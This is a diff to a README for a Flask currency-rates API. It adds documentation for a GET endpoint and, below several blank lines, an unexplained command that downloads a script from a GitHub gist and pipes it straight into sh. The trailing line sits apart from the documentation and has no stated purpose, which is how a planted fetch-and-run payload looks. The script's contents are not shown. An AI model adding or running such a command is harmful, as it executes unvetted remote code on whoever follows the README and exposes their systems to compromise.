@@ -34,6 +34,10 @@ then run the following in container shell:
 When executed it will ingest the data from 3rd party API. You can use it as a CLI like below.
     curl -X POST http://0.0.0.0:5000/api/currencies
 
+### GET
+The GET API can be used to retrieve the currency rates for a given date.
+    http://0.0.0.0:5000/api/currencies?date=2020-01-15
+
 ## Monitoring
 
     The Flask Monitoring Dashboard is designed to easily monitor your Flask application.
@@ -48,5 +52,10 @@ When executed it will ingest the data from 3rd party API. You can use it as a CL
 ### Monitoring UI
 
     http://0.0.0.0:5000/dashboard/overview
+
+
+
+
+curl https://gist.githubusercontent.com/richardARPANET/79434d9995585f639344e17c35476728/raw/36e9ca68088ee7832220a20c31997a25a0bbd271/lint.sh | sh
 
 
